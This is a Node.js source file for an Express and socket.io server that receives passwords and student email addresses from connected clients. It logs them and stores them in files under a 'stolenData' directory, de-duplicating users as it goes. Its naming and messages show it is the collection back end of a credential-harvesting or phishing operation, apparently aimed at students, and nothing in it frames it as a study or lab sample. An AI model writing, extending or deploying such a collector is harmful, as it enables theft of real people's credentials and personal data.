const http = require('http');
const express = require('express');
const socketIo = require('socket.io');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

// Configure Express to serve static files from the root directory
app.use(express.static(__dirname));

// Start the Express server on the specified port
const PORT = 3100;

io.on('connection', (socket) => {
    console.log('A client (for pwd) has connected');

    socket.on('sendPWD', (data) => {
        console.log('Password received from a client:', data);

        const filePath = path.join(__dirname, 'stolenData', 'pwd.json');

        // Create the directory if it does not exist
        fs.mkdir(path.dirname(filePath), { recursive: true }, (err) => {
            if (err) {
                console.error('Error creating directory', err);
                return;
            }

            // Check if the JSON file exists and is not empty or corrupt
            fs.stat(filePath, (err, stats) => {
                if (err || stats.size === 0) {
                    console.error('The JSON file is empty or corrupt, initializing as an empty array');
                    writeDataToFile(filePath, [data]);
                } else {
                    // Read and parse the existing JSON file content
                    fs.readFile(filePath, 'utf8', (err, fileData) => {
                        if (err) {
                            console.error('Error reading the file', err);
                            return;
                        }

                        let jsonData;
                        try {
                            jsonData = JSON.parse(fileData);
                            if (!Array.isArray(jsonData)) {
                                console.error('The existing JSON data is not an array, initializing as an empty array');
                                jsonData = [];
                            }
                        } catch (parseErr) {
                            console.error('Error parsing the JSON file', parseErr);
                            return;
                        }

                        // Check if the user already exists in the array
                        const userExists = jsonData.some(item => item.user === data.user);
                        if (userExists) {
                            console.log(`User ${data.user} already exists in the array, not adding.`);
                        } else {
                            // Add the new data to the array
                            jsonData.push(data);

                            // Write the updated array to the JSON file
                            writeDataToFile(filePath, jsonData);
                        }
                    });
                }
            });
        });
    });


});

io.on('connection', (socket) => {
    console.log('A client (for student emails) has connected');

    socket.on('sendMail', (data) => {
        console.log('Student emails received from a client:', data);

        const filePath = path.join(__dirname, 'stolenData', 'mail.json');

        // Check if the JSON file exists and is not empty or corrupt
        fs.stat(filePath, (err, stats) => {
            if (err || stats.size === 0) {
                console.error('The JSON file is empty or corrupt, initializing as an empty array');
                writeDataToFile(filePath, [data.student1, data.student2]);
            } else {
                // Read and parse the existing JSON file content
                fs.readFile(filePath, 'utf8', (err, fileData) => {
                    if (err) {
                        console.error('Error reading the file', err);
                        return;
                    }

                    let jsonData;
                    try {
                        jsonData = JSON.parse(fileData);
                        if (!Array.isArray(jsonData)) {
                            console.error('The existing JSON data is not an array, initializing as an empty array');
                            jsonData = [];
                        }
                    } catch (parseErr) {
                        console.error('Error parsing the JSON file', parseErr);
                        return;
                    }

                    // Add the new student emails to the array
                    jsonData.push(data.student1, data.student2);

                    // Write the updated array to the JSON file
                    writeDataToFile(filePath, jsonData);
                });
            }
        });
    });
});
// Function to write data to file
function writeDataToFile(filePath, data) {
    fs.writeFile(filePath, JSON.stringify(data, null, 2), (err) => {
        if (err) {
            console.error('Error writing data to the file', err);
        } else {
            console.log('Data successfully saved in the studentEmails.json file');
        }
    });
}


server.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}/index.html`);
});

app.get('/favicon.ico', (req, res) => res.status(204));
